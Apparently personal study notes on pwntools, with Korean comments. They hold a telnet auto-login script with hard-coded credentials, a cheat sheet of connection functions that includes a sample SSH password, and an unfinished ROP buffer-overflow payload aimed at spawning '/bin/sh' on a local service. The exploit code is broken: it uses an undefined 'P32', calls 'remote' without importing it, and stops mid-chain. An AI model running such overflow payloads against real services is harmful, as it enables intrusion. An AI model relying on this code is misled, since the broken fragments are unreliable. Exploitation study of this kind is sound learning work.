import pwn

p = pwn.process(['telnet', '192.168.6.111'])

print(p.recvuntil('kali login: '))
p.sendline('test1')     #userid

print(p.recvuntil('Password: '))
p.sendline('1234')

print(p.recvuntil('$'))
p.sendline('echo 1234')

print(p.recvline())


'''
from pwn import *

conn = remote('localhost', 4444)	# remote(host, port)

 - NC: remote(IP, PORT)
 - Local : process(PATH) 
  ex) p = process("./test")

 - SSH : ssh(USERNAME, IP, PORT, PASSWORD)
  ex) p = ssh("chk1417", "192.168.6.111", port=24477, password="8282op82@#")

 - interaction								# 쉘을 얻어온 후에 상호작용을 가능하게 해줌
  ex) p = remote("192.168.6.111", 24477)
      p.interactive()

1. conn.send(data)							# data 전송, data 는 string형
2. conn.sendline(data)						# 데이터 전송하되, 마지막에 개행문자 ("\n") 를 붙임
3. conn.recv(numb=4096, timeout=default)	# 받은 데이터를 numb만큰 str 으로 반환
4. conn.recvline()							# 한줄 받아서 반환
5. conn.recvuntil(str)						# str가 나올때까지 받은 모든 데이터를 반환
6. conn.recvl(int), recv(int)				# int 만큰 받아올수 있음
'''


import pwn

PPPR = 0x080484b6
read_plt = 0x0804832c
read_got = 0x0804961c
write_plt = 0x0804830c
bss = 0x08049628
offset = 0x99a10
binsh = "/bin/sh"
len_binsh = len(binsh)

p = remote("localhost", 9904)

pay = "A"*140
pay += p32(read_plt)+p32(PPPR)+P32(0)+P32(bss)+p32(len_binsh)


https://lclang.tistroy.com/

